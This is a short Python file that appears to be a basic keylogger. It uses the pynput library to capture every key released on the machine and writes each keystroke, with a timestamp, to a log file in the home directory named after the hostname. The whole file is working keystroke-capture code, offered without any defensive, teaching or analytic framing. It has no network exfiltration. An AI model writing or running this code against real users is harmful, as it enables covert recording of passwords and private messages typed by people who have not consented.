from pynput import keyboard
from pathlib import Path
from datetime import datetime
import platform

LOG_FILE = Path.home() / f"{platform.node()}.log"

def log(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")

def on_release(key):
    try:
        log(key.char)
    except AttributeError:
        log(f"special key: {key}")

def start():    
    with keyboard.Listener(on_release=on_release) as listener:
        listener.join()



